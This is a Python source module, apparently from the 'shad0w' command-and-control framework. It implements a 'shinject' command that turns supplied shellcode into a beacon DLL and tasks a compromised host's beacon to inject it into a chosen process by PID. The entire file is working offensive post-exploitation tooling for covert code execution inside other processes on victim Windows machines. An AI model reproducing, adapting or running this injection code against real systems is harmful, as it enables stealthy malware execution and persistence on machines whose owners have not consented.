#
# Execute shellcode inside a process
#

import os
import json
import base64

from lib import buildtools
# identify the task as shellcode execute
from lib.basecommand import BaseCommand

__description__ = "Execute shellcode inside a process"
__author__ = "@_batsec_"
__type__ = "process"

DLLINJECT_EXEC_ID = 0x5000


class ShinjectCommand(BaseCommand):

    def __init__(self, args):
        BaseCommand.__init__(self, "shinject", args)

    def parse_parameters(self):
        self.parser.add_argument("-p", "--pid", required=True, help="PID to migrate to")
        self.parser.add_argument("-f", "--file", required=True, help="The DLL to inject")

    def get_usage(self):
        return """

Examples:

shinject -p 8725 -f shellcode.bin
"""

    def run(self, shad0w):
        # create the beacon
        rcode = get_file_data(self.args.file)

        # create the beacon dll
        rcode = generate_beacon_dll(shad0w, rcode)

        # make the json info
        inject_info = build_inject_info(self.args, rcode)

        # tell the beacon to execute the dll
        shad0w.beacons[shad0w.current_beacon]["task"] = (DLLINJECT_EXEC_ID, inject_info)
        pass


def build_inject_info(args, rcode):
    # create the json object to tell the beacon where to execute the code

    info = {"pid": int(args.pid), "dll": rcode}

    return json.dumps(info)


def format_shellcode(shellcode):
    hshellcode = ""

    code_size = len(shellcode)

    for num, byte in enumerate(shellcode):
        if num != code_size - 1:
            hshellcode += f"{hex(byte)},"
        else:
            hshellcode += f"{hex(byte)}"

    return hshellcode


def write_header(code, file_loc):
    hex_code = format_shellcode(code)

    TEMPLATE = """unsigned char beacon_bin[] = { %s };
unsigned int beacon_bin_len = %s;
"""

    header = TEMPLATE % (hex_code, len(code))
    with open(file_loc, 'w') as file:
        file.write(header)

    return


def get_dll_data(file_loc):
    with open(file_loc, "rb") as file:
        data = file.read()

    return base64.b64encode(data).decode()


def generate_beacon_dll(shad0w, rcode):
    # write header file
    write_header(rcode, "/root/shad0w/modules/windows/shinject/beacon.h")

    # build the dll
    buildtools.clone_source_files(rootdir="/root/shad0w/modules/windows/shinject/",
                                  basedir="/root/shad0w/modules/windows/shinject/")
    made = buildtools.make_in_clone(modlocation="/root/shad0w/modules/windows/shinject/module.dll",
                                    builddir=os.getcwd(), make_target="x64")

    # check that the dll has built
    if not made:
        shad0w.debug.error("Error building migrate dll")
        return

    # return the base64 dll data
    return get_dll_data("/root/shad0w/modules/windows/shinject/module.dll")


def get_file_data(filename):
    # get the data from the file

    # so we are in the bridge
    bdir = os.getcwd()
    os.chdir("/root/shad0w/.bridge")

    try:
        with open(filename, 'rb') as file:
            data = file.read()
    except FileNotFoundError:
        return None

    # hop back to where we where before
    os.chdir(bdir)

    return data


def main(shad0w, args):

    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.log("ERROR: No active beacon.", log=True)
        return

    cmd = ShinjectCommand(args)
    if cmd.parse() is True:
        cmd.run(shad0w)

    return
